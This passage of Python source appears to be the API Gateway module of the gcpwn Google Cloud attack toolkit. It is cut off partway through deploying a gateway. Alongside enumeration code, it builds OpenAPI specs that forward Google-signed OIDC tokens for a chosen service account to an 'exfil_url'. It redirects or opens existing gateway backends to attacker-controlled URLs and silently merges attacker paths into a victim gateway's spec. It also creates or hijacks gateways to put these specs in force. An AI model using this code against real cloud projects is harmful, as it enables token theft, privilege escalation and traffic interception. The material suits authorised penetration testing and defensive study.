from __future__ import annotations

import base64
from pathlib import Path
from typing import Any, Iterable

from gcpwn.core.console import UtilityTools
from gcpwn.core.utils.action_recording import record_permissions
from gcpwn.core.utils.iam_permissions import call_discovery_test_iam_permissions
from gcpwn.core.utils.service_runtime import build_discovery_service
from gcpwn.core.utils.module_helpers import (
    extract_path_segment,
    extract_path_tail,
    extract_project_id_from_resource,
    region_resolver_for,
)
from gcpwn.core.utils.persistence import save_to_table
from gcpwn.core.utils.serialization import field_from_row, resource_to_dict
from gcpwn.core.utils.service_runtime import DownloadBudget, handle_service_error


def _safe_path_parts(relative_path: str) -> list[str]:
    parts: list[str] = []
    for part in Path(str(relative_path or "")).parts:
        token = str(part).strip()
        if not token or token in {".", "..", "/"}:
            continue
        parts.append(token)
    return parts


def _flatten_filename_parts(parts: list[str]) -> str:
    tokens = [str(part).strip().replace("/", "_") for part in (parts or []) if str(part).strip()]
    return "_".join(tokens)


def _file_payload_from_openapi_document(document: Any) -> dict[str, Any]:
    """Extract the embedded file dict (path + base64 contents) from an OpenAPI doc.

    The SDK's openapi_documents entries nest the actual file under varying keys
    (``document`` / ``source_contents``); this normalizes those shapes to {} on miss.
    """
    payload = resource_to_dict(document)
    file_payload = payload.get("document")
    if isinstance(file_payload, dict):
        return file_payload
    source_payload = payload.get("document") or payload.get("source_contents")
    if isinstance(source_payload, dict):
        return source_payload
    file_attr = getattr(document, "document", None)
    if file_attr is not None:
        return resource_to_dict(file_attr)
    return {}


def _decode_file_contents(contents: Any) -> bytes:
    """Return raw file bytes, decoding base64 strings when they decode cleanly.

    API config file contents arrive as bytes or base64 text; falls back to UTF-8
    encoding of the raw string when it isn't valid base64.
    """
    if isinstance(contents, bytes):
        return contents
    if isinstance(contents, str):
        token = contents
        if not token:
            return b""
        try:
            return base64.b64decode(token.strip(), validate=True)
        except Exception:
            return token.encode("utf-8")
    return str(contents or "").encode("utf-8")


resolve_regions = region_resolver_for("apigateway", ("apigateway", "v1"))


# ── Spec builders ─────────────────────────────────────────────────────────────

def _rand_id(n: int = 16) -> str:
    import random, string
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


def build_oidc_spec(exfil_url: str, path: str | None = None, gateway_host: str = "10.0.0.1") -> tuple[str, str]:
    """Return (openapi_yaml, trigger_path) for an OIDC-capture spec.

    ESPv2 injects a Google-signed OIDC JWT as ``Authorization: Bearer`` when it
    forwards requests to ``exfil_url``.  ``jwt_audience`` is set to ``exfil_url``
    so the JWT validates against the callback.
    """
    random_path = path or _rand_id(16)
    yaml = f"""\
swagger: "2.0"
info:
  title: gcpwn-pe-gateway
  description: "OIDC retrieval via API Gateway gatewayServiceAccount"
  version: "1.0.0"
host: "{gateway_host}"
schemes:
  - "https"
produces:
  - "application/json"
paths:
  /{random_path}:
    get:
      summary: "Token delivery endpoint"
      operationId: "getToken{_rand_id(6)}"
      responses:
        200:
          description: "OK"
      x-google-backend:
        address: "{exfil_url}"
        jwt_audience: "{exfil_url}"
        protocol: "http/1.1"
"""
    return yaml, f"/{random_path}"


def build_proxy_spec(backend_url: str, *, path: str = "proxy", gateway_host: str = "10.0.0.1") -> tuple[str, str]:
    """Return (openapi_yaml, trigger_path) for a proxy/MITM spec.

    Forwards GET and POST to ``backend_url`` without OIDC injection.  Useful for
    redirecting an existing gateway's backend to an attacker-controlled URL.
    """
    path = path.lstrip("/")
    yaml = f"""\
swagger: "2.0"
info:
  title: gcpwn-proxy-spec
  version: "1.0.0"
host: "{gateway_host}"
schemes:
  - "https"
paths:
  /{path}:
    get:
      operationId: proxyGet{_rand_id(4)}
      responses:
        200:
          description: "OK"
      x-google-backend:
        address: "{backend_url}"
        protocol: "http/1.1"
    post:
      operationId: proxyPost{_rand_id(4)}
      parameters:
        - in: body
          name: body
          schema:
            type: object
      responses:
        200:
          description: "OK"
      x-google-backend:
        address: "{backend_url}"
        protocol: "http/1.1"
"""
    return yaml, f"/{path}"


def build_open_spec(backend_url: str, *, path: str = "api", gateway_host: str = "10.0.0.1") -> tuple[str, str]:
    """Return (openapi_yaml, trigger_path) for an open-proxy spec.

    Like build_proxy_spec but covers GET/POST/PUT/DELETE for broader internal
    service access.  No gatewayServiceAccount needed — no OIDC injection.
    """
    path = path.lstrip("/")
    rand_host = gateway_host

    def _backend(op: str) -> str:
        return (
            f"      operationId: open{op.title()}{_rand_id(4)}\n"
            f"      responses:\n        200:\n          description: OK\n"
            f"      x-google-backend:\n        address: \"{backend_url}\"\n        protocol: \"http/1.1\""
        )

    yaml = f"""\
swagger: "2.0"
info:
  title: gcpwn-open-spec
  version: "1.0.0"
host: "{rand_host}"
schemes:
  - "https"
paths:
  /{path}:
    get:
{_backend('get')}
    post:
{_backend('post')}
    put:
{_backend('put')}
    delete:
{_backend('delete')}
"""
    return yaml, f"/{path}"


def _fetch_gateway_hostname(client, gateway_name: str) -> str:
    """Return the default_hostname of an existing gateway, or empty string on failure."""
    try:
        from google.cloud.apigateway_v1 import GetGatewayRequest
        gw = client.get_gateway(request=GetGatewayRequest(name=gateway_name))
        return gw.default_hostname or ""
    except Exception:
        return ""


def _fetch_gateway_spec(client, gateway_name: str) -> str:
    """Return the OpenAPI YAML from the gateway's current active config, or empty string."""
    import base64 as _b64
    try:
        from google.cloud.apigateway_v1 import GetGatewayRequest, GetApiConfigRequest
        gw = client.get_gateway(request=GetGatewayRequest(name=gateway_name))
        if not gw.api_config:
            return ""
        view_enum = getattr(GetApiConfigRequest, "ConfigView", None)
        full_view = getattr(view_enum, "FULL", "FULL")
        cfg = client.get_api_config(
            request=GetApiConfigRequest(name=gw.api_config, view=full_view)
        )
        for doc in cfg.openapi_documents:
            contents = getattr(doc.document, "contents", None)
            if contents:
                if isinstance(contents, bytes):
                    return contents.decode("utf-8", errors="replace")
                try:
                    return _b64.b64decode(contents).decode("utf-8", errors="replace")
                except Exception:
                    return str(contents)
        return ""
    except Exception:
        return ""


def merge_openapi_paths(existing_yaml: str, new_yaml: str) -> str:
    """Inject the paths from new_yaml into existing_yaml, preserving all other existing content.

    Only ``paths`` is merged; ``info``, ``host``, ``schemes``, ``securityDefinitions``
    and every other top-level key come from the existing spec.  New paths that
    collide with existing keys are SKIPPED (we never clobber existing endpoints).
    Returns a YAML string.
    """
    try:
        import yaml as _yaml  # type: ignore
    except ImportError:
        # Fallback: return the new spec as-is when PyYAML is unavailable
        return new_yaml
    existing = _yaml.safe_load(existing_yaml) or {}
    new = _yaml.safe_load(new_yaml) or {}
    existing_paths: dict = existing.get("paths") or {}
    new_paths: dict = new.get("paths") or {}
    for k, v in new_paths.items():
        if k not in existing_paths:
            existing_paths[k] = v
    existing["paths"] = existing_paths
    return _yaml.dump(existing, default_flow_style=False, allow_unicode=True)


class _ApiGatewayBaseResource:
    """Base for API Gateway resources: apigateway_v1 client + lazy discovery testIamPermissions.

    The GAPIC client handles list/get, but testIamPermissions is only on the v1
    discovery service, built lazily on first use. Subclasses set ACTION_RESOURCE_TYPE
    and the test-IAM permission list/api-name. Recorded perms are evidence.
    """

    SERVICE_LABEL = "API Gateway"
    CLOUD_PLATFORM_SCOPE = "https://www.googleapis.com/auth/cloud-platform"
    ACTION_RESOURCE_TYPE = ""
    test_iam_permissions_starting_list: tuple[str, ...] = ()
    test_iam_permissions_api_name = ""

    def __init__(self, session) -> None:
        self.session = session
        try:
            from google.cloud import apigateway_v1  # type: ignore
        except Exception as exc:  # pragma: no cover
            raise RuntimeError(
                "API Gateway enumeration requires the `google-cloud-api-gateway` package."
            ) from exc
        self._apigateway_v1 = apigateway_v1
        self.client = apigateway_v1.ApiGatewayServiceClient(credentials=session.credentials)
        self._discovery_service = None

    def _request(self, callback):
        return callback()

    def resource_name(self, row: Any) -> str:
        payload = resource_to_dict(row)
        return field_from_row(row, payload, "name")

    def _get_discovery_service(self):
        if self._discovery_service is None:
            self._discovery_service = build_discovery_service(
                getattr(self.session, "credentials", None),
                "apigateway",
                "v1",
                scopes=(self.CLOUD_PLATFORM_SCOPE,),
            )
        return self._discovery_service

    def _call_test_iam_permissions(self, *, name: str, request_builder) -> list[str]:
        """Run a testIamPermissions discovery call and return the granted permissions.

        ``request_builder(service, resource_name)`` lets each subclass target the
        right discovery collection (gateways/apis/configs). Returns [] on a disabled
        API or error.
        """
        return call_discovery_test_iam_permissions(
            session=self.session,
            discovery_service=self._get_discovery_service(),
            resource_name=name,
            request_builder=request_builder,
            api_name=self.test_iam_permissions_api_name,
            service_label=self.SERVICE_LABEL,
        )

    def _record_test_iam_permissions(self, *, name: str, permissions: list[str], action_dict=None) -> list[str]:
        if permissions and action_dict is not None:
            record_permissions(
                action_dict,
                permissions=permissions,
                project_id=extract_project_id_from_resource(
                    name,
                    fallback_project=getattr(self.session, "project_id", ""),
                ),
                resource_type=self.ACTION_RESOURCE_TYPE,
                resource_label=str(name or "").strip(),
            )
        return permissions


class ApiGatewayGatewaysResource(_ApiGatewayBaseResource):
    """List/get/testIamPermissions API Gateway gateways (the deployed, hostname-bearing front ends)."""

    TABLE_NAME = "apigateway_gateways"
    ACTION_RESOURCE_TYPE = "gateways"
    LIST_API_NAME = "apigateway.gateways.list"
    GET_API_NAME = "apigateway.gateways.get"
    test_iam_permissions_api_name = "apigateway.gateways.testIamPermissions"
    test_iam_permissions_starting_list = (
        "apigateway.gateways.createTagBinding",
        "apigateway.gateways.delete",
        "apigateway.gateways.deleteTagBinding",
        "apigateway.gateways.get",
        "apigateway.gateways.getIamPolicy",
        "apigateway.gateways.listEffectiveTags",
        "apigateway.gateways.listTagBindings",
        "apigateway.gateways.setIamPolicy",
        "apigateway.gateways.update",
    )
    COLUMNS = [
        "name",
        "default_hostname",
        "state",
    ]

    def test_iam_permissions(self, *, name: str = "", resource_id: str = "", action_dict=None) -> list[str]:
        name = name or resource_id
        permissions = self._call_test_iam_permissions(
            name=name,
            request_builder=lambda service, resource_name: service.projects().locations().gateways().testIamPermissions(
                resource=resource_name,
                body={"permissions": list(self.test_iam_permissions_starting_list)},
            ),
        )
        return self._record_test_iam_permissions(name=name, permissions=permissions, action_dict=action_dict)

    def list(self, *, project_id: str, location: str, action_dict=None):
        parent = f"projects/{project_id}/locations/{location}"
        try:
            request = self._apigateway_v1.ListGatewaysRequest(parent=parent)
            rows = [resource_to_dict(gateway) for gateway in self._request(lambda: self.client.list_gateways(request=request))]
            record_permissions(
                action_dict,
                permissions=self.LIST_API_NAME,
                scope_key="project_permissions",
                scope_label=project_id,
            )
            return rows
        except Exception as exc:
            return handle_service_error(
                exc,
                api_name=self.LIST_API_NAME,
                resource_name=parent,
                service_label=self.SERVICE_LABEL,
                project_id=getattr(self.session, "project_id", None),
            )

    def get(self, *, name: str = "", resource_id: str = "", action_dict=None):
        name = name or resource_id
        try:
            request = self._apigateway_v1.GetGatewayRequest(name=name)
            row = resource_to_dict(self._request(lambda: self.client.get_gateway(request=request)))
            if row:
                record_permissions(
                    action_dict,
                    permissions=self.GET_API_NAME,
                    project_id=extract_project_id_from_resource(
                        row,
                        fallback_project=getattr(self.session, "project_id", ""),
                    ),
                    resource_type=self.ACTION_RESOURCE_TYPE,
                    resource_label=self.resource_name(row),
                )
            return row
        except Exception as exc:
            return handle_service_error(
                exc,
                api_name=self.GET_API_NAME,
                resource_name=name,
                service_label=self.SERVICE_LABEL,
                project_id=getattr(self.session, "project_id", None),
            )

    def update_api_config(self, *, gateway_name: str, api_config_resource: str) -> dict:
        """Update an existing gateway to point at a different API config.

        Only the api_config field is changed; all other gateway attributes are preserved.
        The gateway redeploys with the new config — typically takes 2–8 minutes.
        Requires apigateway.gateways.update (not gateways.create).
        Waits for any in-progress gateway update to settle before issuing a new one.
        """
        import time as _time
        from google.protobuf import field_mask_pb2
        # Wait for any concurrent gateway update to settle before sending ours.
        for _ in range(18):  # up to 3 min, 10 s intervals
            try:
                gw = self.client.get_gateway(
                    request=self._apigateway_v1.GetGatewayRequest(name=gateway_name)
                )
                if gw.state.name != "UPDATING":
                    break
            except Exception:
                break
            _time.sleep(10)
        gateway = self._apigateway_v1.Gateway(name=gateway_name, api_config=api_config_resource)
        mask = field_mask_pb2.FieldMask(paths=["api_config"])
        operation = self.client.update_gateway(
            request=self._apigateway_v1.UpdateGatewayRequest(gateway=gateway, update_mask=mask)
        )
        return resource_to_dict(operation.result(timeout=600))

    def create(self, *, gateway_id: str, project_id: str, region: str, api_config_resource: str) -> dict:
        """Create a gateway in the given region pointing at an existing API config resource."""
        parent = f"projects/{project_id}/locations/{region}"
        gateway = self._apigateway_v1.Gateway(
            display_name="gcpwn-pe-gateway",
            api_config=api_config_resource,
        )
        request = self._apigateway_v1.CreateGatewayRequest(
            parent=parent, gateway_id=gateway_id, gateway=gateway
        )
        operation = self.client.create_gateway(request=request)
        return resource_to_dict(operation.result(timeout=600))

    def delete(self, *, name: str) -> None:
        """Delete a gateway by full resource name. Best-effort — ignores errors."""
        try:
            operation = self.client.delete_gateway(
                request=self._apigateway_v1.DeleteGatewayRequest(name=name)
            )
            operation.result(timeout=120)
        except Exception:
            pass

    def save(self, rows: Iterable[dict[str, Any]], *, project_id: str, location: str | None = None, **_) -> None:
        for row in rows or []:
            save_to_table(self.session, self.TABLE_NAME, row, defaults={"project_id": project_id})


class ApiGatewayApisResource(_ApiGatewayBaseResource):
    """List/get/testIamPermissions API Gateway APIs (always under locations/global)."""

    TABLE_NAME = "apigateway_apis"
    ACTION_RESOURCE_TYPE = "apis"
    LIST_API_NAME = "apigateway.apis.list"
    GET_API_NAME = "apigateway.apis.get"
    test_iam_permissions_api_name = "apigateway.apis.testIamPermissions"
    test_iam_permissions_starting_list = (
        "apigateway.apis.createTagBinding",
        "apigateway.apis.delete",
        "apigateway.apis.deleteTagBinding",
        "apigateway.apis.get",
        "apigateway.apis.getIamPolicy",
        "apigateway.apis.listEffectiveTags",
        "apigateway.apis.listTagBindings",
        "apigateway.apis.setIamPolicy",
        "apigateway.apis.update",
    )
    COLUMNS = [
        "name",
        "managed_service",
        "state",
    ]

    def test_iam_permissions(self, *, name: str = "", resource_id: str = "", action_dict=None) -> list[str]:
        name = name or resource_id
        permissions = self._call_test_iam_permissions(
            name=name,
            request_builder=lambda service, resource_name: service.projects().locations().apis().testIamPermissions(
                resource=resource_name,
                body={"permissions": list(self.test_iam_permissions_starting_list)},
            ),
        )
        return self._record_test_iam_permissions(name=name, permissions=permissions, action_dict=action_dict)

    def list(self, *, project_id: str, location: str | None = None, action_dict=None):
        parent = f"projects/{project_id}/locations/global"
        try:
            request = self._apigateway_v1.ListApisRequest(parent=parent)
            rows = [resource_to_dict(api) for api in self._request(lambda: self.client.list_apis(request=request))]
            record_permissions(
                action_dict,
                permissions=self.LIST_API_NAME,
                scope_key="project_permissions",
                scope_label=project_id,
            )
            return rows
        except Exception as exc:
            return handle_service_error(
                exc,
                api_name=self.LIST_API_NAME,
                resource_name=parent,
                service_label=self.SERVICE_LABEL,
                project_id=getattr(self.session, "project_id", None),
            )

    def get(self, *, name: str = "", resource_id: str = "", action_dict=None):
        name = name or resource_id
        try:
            request = self._apigateway_v1.GetApiRequest(name=name)
            row = resource_to_dict(self._request(lambda: self.client.get_api(request=request)))
            if row:
                record_permissions(
                    action_dict,
                    permissions=self.GET_API_NAME,
                    project_id=extract_project_id_from_resource(
                        row,
                        fallback_project=getattr(self.session, "project_id", ""),
                    ),
                    resource_type=self.ACTION_RESOURCE_TYPE,
                    resource_label=self.resource_name(row),
                )
            return row
        except Exception as exc:
            return handle_service_error(
                exc,
                api_name=self.GET_API_NAME,
                resource_name=name,
                service_label=self.SERVICE_LABEL,
                project_id=getattr(self.session, "project_id", None),
            )

    def create(self, *, api_id: str, project_id: str) -> str:
        """Create an API under locations/global. Returns the full resource name."""
        parent = f"projects/{project_id}/locations/global"
        api = self._apigateway_v1.Api(display_name="gcpwn-pe-api")
        request = self._apigateway_v1.CreateApiRequest(parent=parent, api_id=api_id, api=api)
        operation = self.client.create_api(request=request)
        result = resource_to_dict(operation.result(timeout=120))
        return result.get("name") or f"{parent}/apis/{api_id}"

    def delete(self, *, name: str) -> None:
        """Delete an API by full resource name. Best-effort — ignores errors."""
        try:
            operation = self.client.delete_api(
                request=self._apigateway_v1.DeleteApiRequest(name=name)
            )
            operation.result(timeout=120)
        except Exception:
            pass

    def save(self, rows: Iterable[dict[str, Any]], *, project_id: str, location: str | None = None, **_) -> None:
        for row in rows or []:
            save_to_table(self.session, self.TABLE_NAME, row, defaults={"project_id": project_id})


class ApiGatewayConfigsResource(_ApiGatewayBaseResource):
    """List/get API configs and export their embedded OpenAPI documents to loot files.

    get() requests the FULL view so the OpenAPI document contents are present, and
    surfaces the config's gateway_service_account (the identity the gateway runs
    as). download_openapi_documents() writes the embedded spec files to disk.
    """

    TABLE_NAME = "apigateway_api_configs"
    ACTION_RESOURCE_TYPE = "configs"
    LIST_API_NAME = "apigateway.apiconfigs.list"
    GET_API_NAME = "apigateway.apiconfigs.get"
    test_iam_permissions_api_name = "apigateway.apiconfigs.testIamPermissions"
    test_iam_permissions_starting_list = (
        "apigateway.apiconfigs.delete",
        "apigateway.apiconfigs.get",
        "apigateway.apiconfigs.getIamPolicy",
        "apigateway.apiconfigs.setIamPolicy",
        "apigateway.apiconfigs.update",
    )
    COLUMNS = [
        "name",
        "gateway_service_account",
        "service_config_id",
        "state"
    ]

    def test_iam_permissions(self, *, name: str = "", resource_id: str = "", action_dict=None) -> list[str]:
        name = name or resource_id
        permissions = self._call_test_iam_permissions(
            name=name,
            request_builder=lambda service, resource_name: service.projects().locations().apis().configs().testIamPermissions(
                resource=resource_name,
                body={"permissions": list(self.test_iam_permissions_starting_list)},
            ),
        )
        return self._record_test_iam_permissions(name=name, permissions=permissions, action_dict=action_dict)

    def list(self, *, api_name: str = "", parent: str = "", action_dict=None):
        api_name = api_name or parent
        try:
            request = self._apigateway_v1.ListApiConfigsRequest(parent=api_name)
            rows = [resource_to_dict(config) for config in self._request(lambda: self.client.list_api_configs(request=request))]
            record_permissions(
                action_dict,
                permissions=self.LIST_API_NAME,
                scope_key="project_permissions",
                scope_label=extract_project_id_from_resource(
                    api_name,
                    fallback_project=getattr(self.session, "project_id", ""),
                ),
            )
            return rows
        except Exception as exc:
            return handle_service_error(
                exc,
                api_name=self.LIST_API_NAME,
                resource_name=api_name,
                service_label=self.SERVICE_LABEL,
                project_id=getattr(self.session, "project_id", None),
            )

    def get(self, *, name: str = "", resource_id: str = "", action_dict=None):
        name = name or resource_id
        try:
            view_enum = getattr(self._apigateway_v1.GetApiConfigRequest, "ConfigView", None)
            full_view = getattr(view_enum, "FULL", "FULL")
            request = self._apigateway_v1.GetApiConfigRequest(name=name, view=full_view)
            row = resource_to_dict(self._request(lambda: self.client.get_api_config(request=request)))
            if row:
                record_permissions(
                    action_dict,
                    permissions=self.GET_API_NAME,
                    project_id=extract_project_id_from_resource(
                        row,
                        fallback_project=getattr(self.session, "project_id", ""),
                    ),
                    resource_type=self.ACTION_RESOURCE_TYPE,
                    resource_label=self.resource_name(row),
                )
            return row
        except Exception as exc:
            return handle_service_error(
                exc,
                api_name=self.GET_API_NAME,
                resource_name=name,
                service_label=self.SERVICE_LABEL,
                project_id=getattr(self.session, "project_id", None),
            )

    def download_openapi_documents(self, *, row: dict[str, Any], project_id: str) -> list[Path]:
        """Write each OpenAPI document embedded in a (FULL-view) config row to disk.

        Reconstructs the owning API path when missing, derives safe filenames from
        the document's declared path, base64-decodes the contents, and returns the
        list of files written. Requires a row fetched with the FULL view.
        """
        payload = resource_to_dict(row)
        config_name = str(payload.get("name") or "").strip()
        api_name = str(payload.get("api_name") or "").strip()
        if not api_name:
            config_project = extract_path_segment(config_name, "projects")
            config_location = extract_path_segment(config_name, "locations")
            config_api_id = extract_path_segment(config_name, "apis")
            if config_project and config_location and config_api_id:
                api_name = f"projects/{config_project}/locations/{config_location}/apis/{config_api_id}"
        api_simple = extract_path_tail(api_name, default=api_name) or "unknown-api"
        config_simple = extract_path_tail(config_name, default=config_name) or "unknown-config"
        downloaded_paths: list[Path] = []

        openapi_documents = payload.get("openapi_documents")
        budget = DownloadBudget(self.session, label="API Gateway OpenAPI documents")
        for index, document in enumerate(openapi_documents or [], start=1):
            if budget.exceeded():  # per-type --download-timeout cap: stop and move on
                break
            file_payload = _file_payload_from_openapi_document(document)
            relative_parts = _safe_path_parts(str(file_payload.get("path") or file_payload.get("file_path") or ""))
            relative_name = _flatten_filename_parts(relative_parts) or f"openapi_document_{index}.yaml"
            filename = f"{api_simple}_{config_simple}_{relative_name}"
            subdirs = ["api_configs"]
            destination = self.session.get_download_save_path(
                service_name="apigateway",
                filename=filename,
                project_id=project_id,
                subdirs=subdirs,
            )
            contents = _decode_file_contents(
                file_payload.get("contents")
                or file_payload.get("data")
                or file_payload.get("source_contents")
            )
            destination.write_bytes(contents)
            downloaded_paths.append(destination)

        return downloaded_paths

    def create(self, *, api_id: str, config_id: str, project_id: str, target_sa: str, openapi_yaml: str) -> str:
        """Create an API config, optionally setting gatewayServiceAccount to target_sa.

        The config embeds the provided openapi_yaml spec. When target_sa is non-empty,
        ESPv2 signs OIDC JWTs as target_sa for every request forwarded to the backend.
        Config compilation takes up to ~5 minutes; this call blocks until the LRO completes.
        Returns the full resource name of the created config.
        """
        parent = f"projects/{project_id}/locations/global/apis/{api_id}"
        openapi_docs = [
            self._apigateway_v1.ApiConfig.OpenApiDocument(
                document=self._apigateway_v1.ApiConfig.File(
                    path="openapi.yaml",
                    contents=openapi_yaml.encode("utf-8"),
                )
            )
        ]
        config_kwargs: dict = {
            "display_name": "gcpwn-pe-config",
            "openapi_documents": openapi_docs,
        }
        if target_sa:
            config_kwargs["gateway_service_account"] = target_sa
        api_config = self._apigateway_v1.ApiConfig(**config_kwargs)
        request = self._apigateway_v1.CreateApiConfigRequest(
            parent=parent, api_config_id=config_id, api_config=api_config
        )
        operation = self.client.create_api_config(request=request)
        result = resource_to_dict(operation.result(timeout=300))
        state = str(result.get("state", "")).upper()
        if state in ("FAILED", "3"):
            raise RuntimeError(
                f"API config '{config_id}' entered FAILED state — spec compilation rejected by ESPv2. "
                "Check Cloud Logging for details."
            )
        return result.get("name") or f"{parent}/configs/{config_id}"

    def delete(self, *, name: str) -> None:
        """Delete an API config by full resource name. Best-effort — ignores errors."""
        try:
            operation = self.client.delete_api_config(
                request=self._apigateway_v1.DeleteApiConfigRequest(name=name)
            )
            operation.result(timeout=120)
        except Exception:
            pass

    def save(self, rows: Iterable[dict[str, Any]], *, project_id: str, api_name: str = "", location: str | None = None, **_) -> None:
        for row in rows or []:
            raw_name = str(row.get("name") or "").strip()
            config_project = extract_path_segment(raw_name, "projects")
            config_location = extract_path_segment(raw_name, "locations")
            config_api_id = extract_path_segment(raw_name, "apis")
            inferred_api_name = (
                f"projects/{config_project}/locations/{config_location}/apis/{config_api_id}"
                if config_project and config_location and config_api_id
                else str(api_name or "").strip()
            )
            save_to_table(
                self.session,
                self.TABLE_NAME,
                row,
                defaults={"project_id": project_id, "api_name": api_name},
                extra_builder=lambda _obj, raw: {
                    "api_name": str(raw.get("api_name") or "").strip() or inferred_api_name,
                },
            )


# ── Shared exploit resource lifecycle ─────────────────────────────────────────

def _prompt_pick(prompt: str, items: list, create_label: str) -> int:
    """Return 0-based index of chosen item, or -1 for 'create new'."""
    for i, item in enumerate(items, 1):
        print(f"    [{i}] {item}")
    print(f"    [0] {create_label}")
    while True:
        raw = input(f"  {prompt} ").strip()
        if not raw or raw == "0":
            return -1
        try:
            n = int(raw)
            if 1 <= n <= len(items):
                return n - 1
        except ValueError:
            pass
        print(f"    Enter 0-{len(items)}")


def get_gateway_hostname(session, gateway_name: str) -> str:
    """Return the deployed gateway's default_hostname (e.g. gw-id-hash.uc.gateway.dev).

    Use this BEFORE building a spec so the host: field reflects the real gateway URL.
    Returns empty string on failure (caller should fall back to '10.0.0.1').
    """
    try:
        from google.cloud.apigateway_v1 import ApiGatewayServiceClient
        client = ApiGatewayServiceClient(credentials=session.credentials)
        return _fetch_gateway_hostname(client, gateway_name)
    except Exception:
        return ""


def deploy_apigateway_resources(
    session,
    *,
    project_id: str,
    openapi_yaml: str,
    target_sa: str = "",
    existing_api: str | None = None,
    existing_gateway: str | None = None,
    suffix: str | None = None,
    region: str = "us-central1",
    merge_existing_spec: bool = False,
) -> "dict | None":
    """Create/reuse API → API config → gateway. Returns result dict or None on failure.

    When stdin is a TTY and no --existing-api/--existing-gateway flags are supplied,
    lists existing resources and lets the user reuse one or create new.  In non-TTY
    (scripted) mode always creates fresh resources.

    Returned dict keys: api_resource, config_resource, gw_resource, gw_url,
    api_id, achieved_perms, created_api, created_gateway.
    Permission recording into session is handled internally.
    """
    import sys
    import uuid as _uuid

    suffix = suffix or str(_uuid.uuid4())[:8]
    interactive = sys.stdin.isatty()

    apis_r    = ApiGatewayApisResource(session)
    configs_r = ApiGatewayConfigsResource(session)
    gws_r     = ApiGatewayGatewaysResource(session)

    api_resource: "str | None" = None
    config_resource: "str | None" = None
    gw_resource: "str | None" = None
    gw_url = ""
    api_id = ""
    created_api = False
    created_gateway = False
    achieved_perms: list = []

    # ── Step 1: API ──────────────────────────────────────────────────────────
    if existing_api:
        # Accept either a short ID ("my-api-id") or the full resource name.
        if existing_api.startswith("projects/"):
            api_resource = existing_api
            api_id = existing_api.rsplit("/", 1)[-1]
        else:
            api_id = existing_api
            api_resource = f"projects/{project_id}/locations/global/apis/{api_id}"
        print(f"\n{UtilityTools.CYAN}[1] Using existing API: {api_resource}{UtilityTools.RESET}")
    elif interactive:
        rows = apis_r.list(project_id=project_id, location="global") or []
        if rows:
            names = [str(r.get("name", "")) for r in rows]
            print(f"\n{UtilityTools.CYAN}[1] Existing APIs in {project_id}:{UtilityTools.RESET}")
            idx = _prompt_pick(
                "[?] Reuse one or [0] create new:",
                names,
                f"Create new (gcpwn-pe-api-{suffix})",
            )
            if idx >= 0:
                api_resource = names[idx]
                api_id = api_resource.rsplit("/", 1)[-1]
                print(f"    Reusing: {api_resource}")

    if not api_resource:
        api_id = f"gcpwn-pe-api-{suffix}"
        print(f"\n{UtilityTools.YELLOW}[1] Creating API: {api_id}{UtilityTools.RESET}")
        try:
            api_resource = apis_r.create(api_id=api_id, project_id=project_id)
            achieved_perms.append("apigateway.apis.create")
            created_api = True
        except Exception as e:
            print(f"{UtilityTools.RED}    Error: {e}{UtilityTools.RESET}")
            return None
        print(f"{UtilityTools.GREEN}    Created: {api_resource}{UtilityTools.RESET}")

    # ── Spec merge (--merge-existing-spec) ──────────────────────────────────
    if merge_existing_spec and existing_gateway:
        existing_spec = _fetch_gateway_spec(gws_r.client, existing_gateway)
        if existing_spec:
            print(f"\n{UtilityTools.CYAN}[*] Merging our path into existing gateway spec...{UtilityTools.RESET}")
            openapi_yaml = merge_openapi_paths(existing_spec, openapi_yaml)
        else:
            print(f"\n{UtilityTools.YELLOW}[!] --merge-existing-spec: could not read existing spec; using new spec only.{UtilityTools.RESET}")

    # ── Step 2: API config ───────────────────────────────────────────────────
    config_id = f"gcpwn-pe-config-{suffix}"
    sa_hint = f" (gatewayServiceAccount={target_sa})" if target_sa else ""
    print(f"\n{UtilityTools.YELLOW}[2] Creating API config{sa_hint}{UtilityTools.RESET}")
    print(f"    {UtilityTools.YELLOW}Waiting up to 5 min for ESPv2 compilation...{UtilityTools.RESET}")
    try:
        config_resource = configs_r.create(
            api_id=api_id,
            config_id=config_id,
            project_id=project_id,
            target_sa=target_sa,
            openapi_yaml=openapi_yaml,
        )
        achieved_perms.append("apigateway.apiconfigs.create")
        if target_sa:
            achieved_perms.append("iam.serviceAccounts.actAs")
    except Exception as e:
        print(f"{UtilityTools.RED}    Error: {e}{UtilityTools.RESET}")
        if created_api and api_resource:
            apis_r.delete(name=api_resource)
        return None
    print(f"{UtilityTools.GREEN}    Created: {config_resource}{UtilityTools.RESET}")

    # ── Step 3: gateway ──────────────────────────────────────────────────────
    chosen_gateway = existing_gateway
    if not chosen_gateway and interactive:
        rows = gws_r.list(project_id=project_id, location=region) or []
        if rows:
            gw_names = [str(r.get("name", "")) for r in rows]
            print(f"\n{UtilityTools.CYAN}[3] Existing gateways in {project_id}/{region}:{UtilityTools.RESET}")
            idx = _prompt_pick(
                "[?] Update one or [0] create new:",
                gw_names,
                f"Create new (gcpwn-pe-gw-{suffix})",
            )
            if idx >= 0:
                chosen_gateway = gw_names[idx]

    if chosen_gateway:
        print(f"\n{UtilityTools.YELLOW}[3] Updating gateway: {chosen_gateway}{UtilityTools.RESET}")
        print(f"    {UtilityTools.YELLOW}Waiting up to 10 min for ESPv2 redeploy...{UtilityTools.RESET}")
        try:
            gw_row = gws_r.update_api_config(
                gateway_name=chosen_gateway, api_config_resource=config_resource
            )
            gw_resource = chosen_gateway
            h = gw_row.get("default_hostname", "")
            gw_url = f"https://{h}" if h else ""
            achieved_perms.append("apigateway.gateways.update")
            print(f"{UtilityTools.GREEN}    Updated: {gw_url}{UtilityTools.RESET}")
        except Exception as e:
            print(f"{UtilityTools.RED}    Error: {e}{UtilityTools.RESET}")
            configs_r.delete(name=config_resource)
            if created_api and api_resource:
                apis_r.delete(name=api_resource)
            return None
    else:
        gateway_id = f"gcpwn-pe-gw-{suffix}"
        print(f"\n{UtilityTools.YELLOW}[3] Creating Gateway: {gateway_id}{UtilityTools.RESET}")
        print(f"    {UtilityTools.YELLOW}Waiting up to 10 min for gateway deployment...{UtilityTools.RESET}")
        try:
            gw_row = gws_r.create(
                gateway_id=gateway_id,
                project_id=project_id,
                region=region,
                api_config_resource=config_resource,
            )
            h = gw_row.get("default_hostname", "")
            gw_url = f"https://{h}" if h else ""
            gw_resource = gw_row.get("name", f"projects/{project_id}/locations/{region}/gateways/{gateway_id}")
            achieved_perms.append("apigateway.gateways.create")
